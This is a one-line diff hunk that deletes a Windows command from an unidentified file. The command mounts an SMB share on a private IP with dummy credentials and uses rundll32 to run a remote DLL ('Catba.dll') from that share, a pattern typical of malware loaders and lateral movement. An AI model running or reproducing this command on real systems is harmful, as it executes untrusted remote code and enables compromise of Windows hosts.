@@ -1,1 +1,0 @@
-C:\Windows\System32\cmd.exe /c net use \\10.103.40.97\w /u:a a && rundll32 \\10.103.40.97\w\Catba.dll,C1 10.103.40.97
